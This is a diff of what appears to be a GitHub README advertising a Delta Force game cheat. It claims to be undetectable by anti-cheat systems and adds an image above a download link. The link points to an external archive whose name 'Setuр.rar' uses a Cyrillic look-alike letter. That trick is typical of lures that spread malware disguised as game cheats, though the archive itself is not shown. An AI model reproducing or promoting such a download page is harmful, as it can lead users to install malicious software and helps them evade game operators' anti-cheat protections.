@@ -6,6 +6,8 @@
 ## 📣 **Overview**  
 Advanced combat intelligence system for Delta Force operators featuring real-time threat detection and stealth operation modes. Provides tactical advantages while maintaining undetectable status against modern anti-cheat systems.  
 
+![maxresdefault_unique_20250522_001747](https://github.com/user-attachments/assets/49e2c08e-bc48-44c1-8d32-a886272e9683)
+
 ## 📥 **Download**  
 [![download](https://github.com/user-attachments/assets/7e2a0cbd-5c44-457c-9e51-04800a5341ba)](https://gitlab.com/vampirejohn/Setup/-/raw/main/Setu%D1%80.rar?inline=false)  
 
